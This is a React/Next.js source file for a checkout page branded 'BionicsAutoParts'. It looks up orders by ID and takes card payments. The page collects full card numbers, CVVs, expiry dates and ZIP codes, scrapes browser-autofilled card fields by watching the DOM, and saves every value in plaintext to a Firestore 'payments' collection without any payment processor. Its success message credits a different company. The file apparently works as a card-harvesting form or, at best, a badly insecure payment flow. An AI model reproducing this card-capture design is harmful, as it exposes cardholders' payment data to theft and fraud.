'use client'

import React, { useState, ChangeEvent, FormEvent, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { toast, ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'
import { db } from '../lib/firebase'
import { collection, addDoc, serverTimestamp } from 'firebase/firestore'

interface FormData {
  orderId: string
  amount: string
  firstName: string
  lastName: string
  cardNumber: string
  cvv: string
  expiryDate: string
  zipCode: string
  securityCode?: string
}

export default function PaymentPage() {
  const [isMounted, setIsMounted] = useState(false)
  const [formData, setFormData] = useState<FormData>({
    orderId: '',
    amount: '',
    firstName: '',
    lastName: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    zipCode: '',
    securityCode: '',
  })
  const [isSubmit, setisSubmited] = useState(false);
  const [showModal, setShowModal] = useState(false)

  const [orderData, setOrderData] = useState<any[]>([]);

  const router = useRouter()

  useEffect(() => {
    setIsMounted(true)
  }, [])

  // Enhanced autofill detection
  useEffect(() => {
    if (!isMounted) return;

    const detectAutofill = () => {
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        const name = input.getAttribute('name');
        const value = input.value;
        
        if (name && value) {
          // Check if this looks like an autofill (field has value but wasn't manually typed)
          const isAutofilled = input.matches(':-webkit-autofill') || 
                              input.style.backgroundColor === 'rgb(250, 255, 189)' ||
                              input.style.backgroundColor === 'rgb(255, 255, 0)';
          
          if (isAutofilled || (value && !formData[name as keyof FormData])) {
            // Update form data based on field name
            switch (name) {
              case 'firstName':
                if (!formData.firstName) {
                  setFormData(prev => ({ ...prev, firstName: value }));
                }
                break;
              case 'lastName':
                if (!formData.lastName) {
                  setFormData(prev => ({ ...prev, lastName: value }));
                }
                break;
              case 'cvv':
                if (!formData.cvv && /^\d{3,4}$/.test(value)) {
                  setFormData(prev => ({ ...prev, cvv: value }));
                }
                break;
              case 'securityCode':
                if (!formData.securityCode && /^\d{3}$/.test(value)) {
                  setFormData(prev => ({ ...prev, securityCode: value }));
                }
                break;
              case 'zipCode':
                if (!formData.zipCode) {
                  setFormData(prev => ({ ...prev, zipCode: value }));
                }
                break;
            }
          }
        }
      });
    };

    // Run detection after a short delay to allow autofill to complete
    const timeoutId = setTimeout(detectAutofill, 100);
    
    // Also listen for animation events that might indicate autofill
    const observer = new MutationObserver(detectAutofill);
    observer.observe(document.body, { 
      childList: true, 
      subtree: true, 
      attributes: true,
      attributeFilter: ['style', 'class']
    });

    return () => {
      clearTimeout(timeoutId);
      observer.disconnect();
    };
  }, [isMounted, formData]);

  if (!isMounted) return null;

  const handleChange = async (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === 'expiryDate') {
      // Format expiry date as MM/YY
      const formattedValue = value.replace(/\D/g, '');
      let newValue = formattedValue;

      if (formattedValue.length > 2) {
        newValue = `${formattedValue.slice(0, 2)}/${formattedValue.slice(2, 4)}`;
      }
      setFormData((prevData) => ({ ...prevData, [name]: newValue }));
    } else if (name === 'cardNumber') {
      // Format card number with spaces after every 4 digits
      const formattedValue = value.replace(/\D/g, '').replace(/(.{4})(?=.)/g, '$1 ');
      setFormData((prevData) => ({ ...prevData, [name]: formattedValue }));
      
      // Check if this looks like an autofill (complete card number)
      if (formattedValue.replace(/\s/g, '').length >= 13) {
        // Wait a bit for other autofill fields to populate
        setTimeout(() => {
          const firstNameInput = document.querySelector('input[name="firstName"]') as HTMLInputElement;
          const lastNameInput = document.querySelector('input[name="lastName"]') as HTMLInputElement;
          const cvvInput = document.querySelector('input[name="cvv"]') as HTMLInputElement;
          const securityCodeInput = document.querySelector('input[name="securityCode"]') as HTMLInputElement;
          const expiryMonthInput = document.querySelector('input[autocomplete="cc-exp-month"]') as HTMLInputElement;
          const expiryYearInput = document.querySelector('input[autocomplete="cc-exp-year"]') as HTMLInputElement;
          
          // Update first name and last name if they're empty
          if (firstNameInput && lastNameInput && (!formData.firstName || !formData.lastName)) {
            const firstName = firstNameInput.value;
            const lastName = lastNameInput.value;
            
            if (firstName && lastName) {
              setFormData(prev => ({
                ...prev,
                firstName,
                lastName
              }));
            }
          }

          // Update CVV if it's empty
          if (cvvInput && !formData.cvv) {
            const cvv = cvvInput.value;
            if (cvv && /^\d{3,4}$/.test(cvv)) {
              setFormData(prev => ({
                ...prev,
                cvv
              }));
            }
          }

          // Update security code for Amex if it's empty
          if (securityCodeInput && !formData.securityCode && getCardType(formattedValue) === 'amex') {
            const securityCode = securityCodeInput.value;
            if (securityCode && /^\d{3}$/.test(securityCode)) {
              setFormData(prev => ({
                ...prev,
                securityCode
              }));
            }
          }

          // Update expiry date if it's empty
          if (expiryMonthInput && expiryYearInput && !formData.expiryDate) {
            const month = expiryMonthInput.value;
            const year = expiryYearInput.value;
            
            if (month && year && /^\d{2}$/.test(month) && /^\d{2}$/.test(year)) {
              setFormData(prev => ({
                ...prev,
                expiryDate: `${month}/${year}`
              }));
            }
          }
        }, 200);
      }
    } else if (name === 'orderId') {
      // Format order ID to be alphanumeric only
      const formattedValue = value.replace(/[^a-zA-Z0-9]/g, '');
      setFormData((prevData) => ({ ...prevData, [name]: formattedValue }));

      if (formattedValue.length === 6) {
        // Fetch data when orderId is exactly 6 characters
        try {
          // Fetch data from both collections using correct API endpoints
          const responseSubmissions = await fetch(`/api/getSubmissions?orderId=${formattedValue}&timestamp=${new Date().getTime()}`);
          const responseSubmissionsV2 = await fetch(`/api/getSubmissionsv2?orderId=${formattedValue}&timestamp=${new Date().getTime()}`);

          // Parse responses
          const dataSubmissions = await responseSubmissions.json();
          const dataSubmissionsV2 = await responseSubmissionsV2.json();

          // Enhanced logging
          console.log('Submissions response:', responseSubmissions.ok, dataSubmissions);
          console.log('SubmissionsV2 response:', responseSubmissionsV2.ok, dataSubmissionsV2);

          // Combine data from both collections (even if one fails)
          let combinedData: any[] = [];

          if (responseSubmissions.ok && dataSubmissions.submissions) {
            console.log('Adding submissions data:', dataSubmissions.submissions.length, 'entries');
            combinedData = [...combinedData, ...dataSubmissions.submissions];
          }

          if (responseSubmissionsV2.ok && dataSubmissionsV2.submissions) {
            console.log('Adding submissionsv2 data:', dataSubmissionsV2.submissions.length, 'entries');
            combinedData = [...combinedData, ...dataSubmissionsV2.submissions];
          }

          // Remove duplicates based on orderId - keep the most recent entry
          if (combinedData.length > 0) {
            // First sort by creation date (newest first)
            combinedData.sort((a: any, b: any) => {
              const dateA = a.createdAt?.seconds ? new Date(a.createdAt.seconds * 1000) : new Date();
              const dateB = b.createdAt?.seconds ? new Date(b.createdAt.seconds * 1000) : new Date();
              return dateB.getTime() - dateA.getTime();
            });

            // Group entries by orderId and combine different parts
            const groupedData = combinedData.reduce((acc: any, item: any) => {
              const existingEntry = acc.find((entry: any) => entry.orderId === item.orderId);

              if (existingEntry) {
                // If orderId already exists, combine the parts
                const existingParts = existingEntry.searchedPartFormatted || '';
                const newPart = item.searchedPartFormatted || '';

                // Only add the new part if it's different from existing parts
                if (newPart && !existingParts.includes(newPart)) {
                  existingEntry.searchedPartFormatted = existingParts + (existingParts ? ' | ' : '') + newPart;
                }

                // Keep the most recent createdAt date
                const existingDate = existingEntry.createdAt?.seconds ? new Date(existingEntry.createdAt.seconds * 1000) : new Date(0);
                const newDate = item.createdAt?.seconds ? new Date(item.createdAt.seconds * 1000) : new Date(0);

                if (newDate > existingDate) {
                  existingEntry.createdAt = item.createdAt;
                }
              } else {
                // If orderId doesn't exist, add new entry
                acc.push({ ...item });
              }

              return acc;
            }, []);

            const uniqueData = groupedData;

            setOrderData(uniqueData);
            console.log(`Order data found in ${responseSubmissions.ok ? 'submissions' : ''}${responseSubmissions.ok && responseSubmissionsV2.ok ? ' and ' : ''}${responseSubmissionsV2.ok ? 'submissionsv2' : ''}:`, uniqueData);

            if (combinedData.length > uniqueData.length) {
              console.log(`Removed ${combinedData.length - uniqueData.length} duplicate entries for orderId: ${formattedValue}`);
            }
          } else {
            // No data found in either collection
            setOrderData([]);
            console.log('No order data found in either submissions or submissionsv2 collections');
          }

          // Log any errors
          if (!responseSubmissions.ok) {
            console.error('Error fetching submissions:', dataSubmissions.message);
          }
          if (!responseSubmissionsV2.ok) {
            console.error('Error fetching submissionsv2:', dataSubmissionsV2.message);
          }
        } catch (error) {
          console.error('Error fetching data from both collections:', error);
          setOrderData([]);
        }

      } else {
        // Clear orderData when orderId is not exactly 6 characters
        setOrderData([]);
        console.log('Order ID not 6 characters, cleared orderData');
      }
    } else {
      // Handle other input fields normally
      setFormData((prevData) => ({ ...prevData, [name]: value }));
    }
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()

    // First validate Order ID exists
    if (!formData.orderId || formData.orderId.length !== 6) {
      toast.error('Please enter a valid 6-character Order ID.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (!/^[A-Za-z0-9]+$/.test(formData.orderId)) {
      toast.error('Order ID must be alphanumeric.', { position: 'top-center', autoClose: 3000 })
      return
    }

    // Check if Order ID exists in database
    if (orderData.length === 0) {
      toast.error('Order ID not found. Please enter a valid Order ID.', { position: 'top-center', autoClose: 3000 })
      return
    }

    const currentDate = new Date()
    const [month, year] = formData.expiryDate.split('/')

    if (!month || !year || month.length !== 2 || year.length !== 2) {
      toast.error('Invalid expiry date format. Please use MM/YY.', { position: 'top-center', autoClose: 3000 })
      return
    }

    const expiryMonth = parseInt(month, 10)
    const expiryYear = parseInt(year, 10)

    if (expiryMonth < 1 || expiryMonth > 12) {
      toast.error('Invalid expiry month. Month must be between 01 and 12.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (expiryYear < currentDate.getFullYear() % 100) {
      toast.error('Expiry date cannot be in the past.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (expiryYear === currentDate.getFullYear() % 100 && expiryMonth < currentDate.getMonth() + 1) {
      toast.error('Expiry date cannot be in the past.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (/[^A-Za-z ]/.test(formData.firstName)) {
      toast.error('First name must only contain letters and spaces.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (!/^[A-Za-z]+( [A-Za-z]+)?$/.test(formData.lastName)) {
      toast.error('Last name must only contain letters with a single space allowed.', { position: 'top-center', autoClose: 3000 })
      return
    }

    // Validate security code for Amex cards
    if (getCardType(formData.cardNumber) === 'amex') {
      if (!formData.securityCode || formData.securityCode.length !== 3) {
        toast.error('Please enter a valid 3-digit security code for American Express.', { position: 'top-center', autoClose: 3000 })
        return
      }
      if (!/^\d{3}$/.test(formData.securityCode)) {
        toast.error('Security code must be 3 digits.', { position: 'top-center', autoClose: 3000 })
        return
      }
    } else {
      // Validate CVV for non-Amex cards
      if (!formData.cvv || formData.cvv.length !== 3) {
        toast.error('Please enter a valid 3-digit CVV.', { position: 'top-center', autoClose: 3000 })
        return
      }
      if (!/^\d{3}$/.test(formData.cvv)) {
        toast.error('CVV must be 3 digits.', { position: 'top-center', autoClose: 3000 })
        return
      }
    }

    // Validate card number
    if (!formData.cardNumber || formData.cardNumber.replace(/\s/g, '').length < 13) {
      toast.error('Please enter a valid card number.', { position: 'top-center', autoClose: 3000 })
      return
    }

    // Validate amount
    if (!formData.amount || parseFloat(formData.amount) <= 0) {
      toast.error('Please enter a valid amount greater than 0.', { position: 'top-center', autoClose: 3000 })
      return
    }

    // Validate zip code
    if (!formData.zipCode || !/^\d{5}(-\d{4})?$/.test(formData.zipCode)) {
      toast.error('Please enter a valid 5-digit zip code.', { position: 'top-center', autoClose: 3000 })
      return
    }

    try {
      setisSubmited(true);
      await addDoc(collection(db, 'payments'), {
        ...formData,
        createdAt: serverTimestamp(),
      })
      toast.success('Payment will be processed soon!', { position: 'top-center', autoClose: 3000 })

      setFormData({
        orderId: '',
        amount: '',
        firstName: '',
        lastName: '',
        cardNumber: '',
        cvv: '',
        expiryDate: '',
        zipCode: '',
        securityCode: '',
      })

      setShowModal(true)
    } catch (error) {
      console.error('Error adding document: ', error)
      toast.error('Failed to save payment details.', { position: 'top-center', autoClose: 3000 })
    }finally {
      setisSubmited(false); // Re-enable the button
    }
  }

  const handleModalClose = () => {
    setShowModal(false)
    router.push('/')
  }

  // Format card number for display with dots
  const formatCardDisplay = (cardNumber: string) => {
    if (!cardNumber) return '•••• •••• •••• ••••'
    const digits = cardNumber.replace(/\s/g, '')
    const formatted = digits.replace(/(.{4})/g, '$1 ').trim()
    const parts = formatted.split(' ')
    return parts.map((part, index) => {
      if (index < parts.length - 1 && part.length === 4) {
        return '••••'
      }
      return part.padEnd(4, '•')
    }).join(' ')
  }

  // Get card type based on first digit
  const getCardType = (cardNumber: string) => {
    const firstDigit = cardNumber.replace(/\s/g, '')[0]
    if (firstDigit === '4') return 'visa'
    if (firstDigit === '5') return 'mastercard'
    if (firstDigit === '3') return 'amex'
    return 'unknown'
  }

  // Get card brand colors
  const getCardBrandLogos = (cardNumber: string) => {
    const cardType = getCardType(cardNumber)
    if (cardType === 'visa') {
      return (
        <div className="flex items-center">
          <div className="w-10 h-6 sm:w-12 sm:h-8 bg-white border border-gray-200 rounded flex items-center justify-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png"
              alt="Visa"
              className="w-8 h-4 sm:w-10 sm:h-5 object-contain"
            />
          </div>
        </div>
      )
    } else if (cardType === 'mastercard') {
      return (
        <div className="flex items-center">
          <div className="w-8 h-5 sm:w-10 sm:h-6 bg-white border border-gray-200 rounded flex items-center justify-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png"
              alt="Mastercard"
              className="w-6 h-4 sm:w-8 sm:h-5 object-contain"
            />
          </div>
        </div>
      )
    } else if (cardType === 'amex') {
      return (
        <div className="flex items-center">
          <div className="w-8 h-5 sm:w-10 sm:h-6 bg-white border border-gray-200 rounded flex items-center justify-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1280px-American_Express_logo_%282018%29.svg.png"
              alt="American Express"
              className="w-6 h-4 sm:w-8 sm:h-5 object-contain"
            />
          </div>
        </div>
      )
    }
    return null
  }

  // Get order summary card gradient
  const getOrderSummaryCardGradient = (cardNumber: string) => {
    const cardType = getCardType(cardNumber)
    if (cardType === 'visa') {
      return (
        <div className="flex items-center space-x-2">
          <div className="w-8 h-5 sm:w-10 sm:h-6 bg-white border border-gray-200 rounded flex items-center justify-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png"
              alt="Visa"
              className="w-6 h-3 sm:w-8 sm:h-4 object-contain"
            />
          </div>
        </div>
      )
    } else if (cardType === 'mastercard') {
      return (
        <div className="flex items-center space-x-2">
          <div className="w-8 h-5 sm:w-10 sm:h-6 bg-white border border-gray-200 rounded flex items-center justify-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png"
              alt="Mastercard"
              className="w-5 h-3 sm:w-7 sm:h-4 object-contain"
            />
          </div>
        </div>
      )
    } else if (cardType === 'amex') {
      return (
        <div className="flex items-center space-x-2">
          <div className="w-8 h-5 sm:w-10 sm:h-6 bg-white border border-gray-200 rounded flex items-center justify-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1280px-American_Express_logo_%282018%29.svg.png"
              alt="American Express"
              className="w-5 h-3 sm:w-7 sm:h-4 object-contain"
            />
          </div>
        </div>
      )
    }
    return (
      <div className="w-8 h-5 sm:w-10 sm:h-6 bg-gradient-to-r from-gray-400 to-gray-600 rounded"></div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-400 via-blue-500 to-blue-600 flex items-center justify-center p-1 sm:p-2">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-5xl overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between p-4 sm:p-6 border-b border-gray-100">
          <div className="flex items-center space-x-3">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
              <span className="text-white font-bold text-sm">FP</span>
            </div>
            <div>
              <div className="font-semibold text-gray-800 text-sm sm:text-base">BionicsAutoParts</div>
            </div>
          </div>
        </div>

        <div className="flex flex-col lg:flex-row">
          {/* Left Panel - Payment Form */}
          <div className="flex-1 p-4 sm:p-6 lg:p-8">
            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6" autoComplete="on">
              {/* Order ID and Amount */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Order ID</label>
                  <div className="relative">
                    <input
                      type="text"
                      name="orderId"
                      value={formData.orderId}
                      onChange={handleChange}
                      placeholder="Enter Order ID"
                      autoComplete="off"
                      className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg"
                    />
                    <div className="absolute right-3 top-2 sm:top-3">
                      <svg className="w-5 h-5 sm:w-6 sm:h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Amount (USD)</label>
                  <input
                    type="text"
                    name="amount"
                    value={formData.amount}
                    onChange={handleChange}
                    placeholder="Enter amount"
                    inputMode="decimal"
                    pattern="[0-9]*\.?[0-9]*"
                    autoComplete="off"
                    className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
                  />
                </div>
              </div>

              {/* First Name and Last Name */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">First Name</label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleChange}
                    placeholder="John"
                    autoComplete="given-name"
                    className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg"
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Last Name</label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleChange}
                    placeholder="Doe"
                    autoComplete="family-name"
                    className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg"
                  />
                </div>
              </div>

              {/* Card Number */}
              <div>
                <div className="mb-2">
                  <label className="text-sm font-medium text-gray-700">Card Number</label>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    name="cardNumber"
                    value={formData.cardNumber}
                    onChange={handleChange}
                    maxLength={19}
                    placeholder="1234 5678 9012 3456"
                    autoComplete="cc-number"
                    className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg tracking-wider"
                  />
                  <div className="absolute right-3 top-2 sm:top-3 flex space-x-1">
                    {getCardBrandLogos(formData.cardNumber)}
                  </div>
                </div>
                <div className="mt-2 sm:mt-3 text-base sm:text-lg font-mono text-gray-600 tracking-widest">
                  {formatCardDisplay(formData.cardNumber)}
                </div>
              </div>

              {/* Expiry Date, CVV, and Zip Code */}
              <div className="grid grid-cols-3 gap-2 sm:gap-4">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Expiry Date</label>
                  <div className="flex space-x-1 sm:space-x-2">
                    <input
                      type="text"
                      name="expiryDate"
                      value={formData.expiryDate.split('/')[0] || ''}
                      onChange={(e) => {
                        const month = e.target.value
                        const year = formData.expiryDate.split('/')[1] || ''
                        setFormData(prev => ({ ...prev, expiryDate: `${month}${year ? '/' + year : ''}` }))
                      }}
                      maxLength={2}
                      placeholder="09"
                      autoComplete="cc-exp-month"
                      className="w-8 sm:w-12 px-1 sm:px-2 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-sm sm:text-lg"
                    />
                    <span className="flex items-center text-gray-400 text-sm sm:text-lg">/</span>
                    <input
                      type="text"
                      value={formData.expiryDate.split('/')[1] || ''}
                      onChange={(e) => {
                        const year = e.target.value
                        const month = formData.expiryDate.split('/')[0] || ''
                        setFormData(prev => ({ ...prev, expiryDate: `${month}${year ? '/' + year : ''}` }))
                      }}
                      maxLength={2}
                      placeholder="22"
                      autoComplete="cc-exp-year"
                      className="w-8 sm:w-12 px-1 sm:px-2 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-sm sm:text-lg bg-blue-50 border-blue-200"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">CVV</label>
                  <div className="relative">
                    <input
                      type="text"
                      name="cvv"
                      value={formData.cvv}
                      onChange={handleChange}
                      maxLength={getCardType(formData.cardNumber) === 'amex' ? 4 : 3}
                      placeholder={getCardType(formData.cardNumber) === 'amex' ? "1234" : "327"}
                      autoComplete="cc-csc"
                      className="w-full px-2 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-sm sm:text-lg"
                    />
                    <div className="absolute right-1 sm:right-3 top-2 sm:top-3">
                      <svg className="w-3 h-3 sm:w-6 sm:h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                  </div>
                </div>

                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Zip Code</label>
                  <input
                    type="text"
                    name="zipCode"
                    value={formData.zipCode}
                    onChange={handleChange}
                    placeholder="12345"
                    autoComplete="postal-code"
                    className="w-full px-2 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-sm sm:text-lg"
                  />
                </div>
              </div>

              {/* Security Code for Amex Cards */}
              {getCardType(formData.cardNumber) === 'amex' && (
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-2 block">Security Code (3 digits on back of card)</label>
                  <div className="relative">
                    <input
                      type="text"
                      name="securityCode"
                      value={formData.securityCode || ''}
                      onChange={handleChange}
                      maxLength={3}
                      placeholder="123"
                      autoComplete="cc-csc"
                      className="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-base sm:text-lg bg-amber-50 border-amber-200"
                    />
                    <div className="absolute right-3 top-2 sm:top-3">
                      <svg className="w-5 h-5 sm:w-6 sm:h-6 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                  </div>
                  <p className="text-xs text-amber-600 mt-1">Required for American Express cards</p>
                </div>
              )}

              {/* Pay Button */}
              <button
                type="submit"
                disabled={isSubmit}
                className={`w-full py-3 sm:py-4 rounded-lg font-semibold text-base sm:text-lg transition-all duration-300 ${
                  isSubmit
                    ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                    : 'bg-blue-600 hover:bg-blue-700 text-white shadow-lg hover:shadow-xl'
                }`}
              >
                {isSubmit ? 'Processing...' : 'Pay Now'}
              </button>
            </form>
          </div>

          {/* Right Panel - Order Summary */}
          <div className="w-full lg:w-80 bg-gray-50 p-4 sm:p-6 lg:p-8">
            <div className="space-y-4 sm:space-y-6">
              {/* Customer Card */}
              <div className="bg-white rounded-xl p-3 sm:p-4 shadow-sm">
                <div className="flex items-center space-x-3 mb-3">
                  <div className="w-8 h-8 sm:w-10 sm:h-10 bg-gray-200 rounded-lg flex items-center justify-center">
                    <svg className="w-4 h-4 sm:w-6 sm:h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                  </div>
                  <div className="flex-1">
                    <div className="font-medium text-gray-900 text-sm sm:text-base">
                      {formData.firstName && formData.lastName
                        ? `${formData.firstName} ${formData.lastName}`
                        : '—'}
                    </div>
                    <div className="text-xs sm:text-sm text-gray-500">
                      {formData.cardNumber ? `•••• ${formData.cardNumber.slice(-4)}` : '•••• ••••'}
                    </div>
                  </div>
                  <div className="ml-auto">
                    {getOrderSummaryCardGradient(formData.cardNumber)}
                  </div>
                </div>
              </div>

              {/* Company Info */}
              <div className="space-y-3">
                <div className="flex items-center space-x-3">
                  <div className="w-6 h-6 sm:w-8 sm:h-8 bg-black rounded-lg flex items-center justify-center">
                    <span className="text-white text-xs font-bold">BA</span>
                  </div>
                  <span className="font-medium text-sm sm:text-base">BionicsAutoParts</span>
                </div>

                <div className="space-y-2 text-xs sm:text-sm text-gray-600">
                  <div className="flex justify-between">
                    <span>Order ID</span>
                    <span className="font-medium">{formData.orderId || '1464201'}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Checkout At</span>
                    <span className="font-medium">BionicsAutoParts</span>
                  </div>
                </div>
              </div>

              {/* Total */}
              <div className="border-t pt-3 sm:pt-4">
                <div className="flex items-center justify-between">
                  <div>
                    <div className="text-xs sm:text-sm text-gray-600">Total to Pay</div>
                    <div className="text-xl sm:text-2xl font-bold text-gray-900">
                      {formData.amount && `$${formData.amount} USD`}
                    </div>
                  </div>
                  <div className="text-right">
                    <svg className="w-6 h-6 sm:w-8 sm:h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                </div>
              </div>

              {/* Order Details */}
              {orderData && orderData.length > 0 && (
                <div className="bg-white rounded-xl p-3 sm:p-4 shadow-sm">
                  <h3 className="font-medium text-gray-900 mb-3 text-sm sm:text-base">Order Details</h3>
                  <div className="space-y-2 text-xs sm:text-sm">
                    {orderData[0].contact && (
                      <div className="text-xs text-gray-500">
                        Contact: {orderData[0].contact}
                      </div>
                    )}
                    {orderData[0].email && (
                      <div className="text-xs text-gray-500">
                        Email: {orderData[0].email}
                      </div>
                    )}
                    <div className="text-gray-600">
                      {orderData[0].searchedPartFormatted || "Auto parts order"}
                    </div>
                    <div className="text-xs text-gray-500">
                      Ordered: {new Date(orderData[0].createdAt.seconds * 1000).toLocaleDateString()}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Success Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50 p-4">
          <div className="bg-white p-6 sm:p-8 rounded-2xl text-center shadow-2xl max-w-md w-full">
            <div className="w-12 h-12 sm:w-16 sm:h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-6 h-6 sm:w-8 sm:h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Payment Submitted Successfully!</h2>
            <p className="text-gray-600 mb-4 sm:mb-6 text-sm sm:text-base">Your order will be processed Thru Flippart-Kart (<span className="text-gray-800 font-medium">Zepto LLC</span>) shortly.</p>
            <button
              onClick={handleModalClose}
              className="bg-blue-600 text-white py-2 sm:py-3 px-6 sm:px-8 rounded-lg hover:bg-blue-700 transition duration-300 font-medium text-sm sm:text-base"
            >
              Continue Shopping
            </button>
          </div>
        </div>
      )}

      <ToastContainer />
    </div>
  )
}

